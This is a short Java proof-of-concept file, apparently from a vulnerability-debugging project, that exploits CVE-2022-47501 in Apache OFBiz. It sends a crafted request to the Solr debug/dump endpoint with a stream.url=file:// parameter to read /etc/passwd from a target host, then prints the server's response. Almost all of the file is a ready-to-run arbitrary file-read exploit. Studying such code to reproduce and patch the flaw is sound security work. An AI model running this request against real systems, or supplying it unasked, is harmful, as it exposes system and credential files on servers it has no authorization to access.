package ofbiz.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;

import java.io.IOException;

public class CVE_2022_47501 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.200:8080/solr/solrdefault/debug/dump?param=ContentStreams&stream.url=file://";

        String file = "/etc/passwd";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpGet httpGet = new HttpGet(url + file);
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
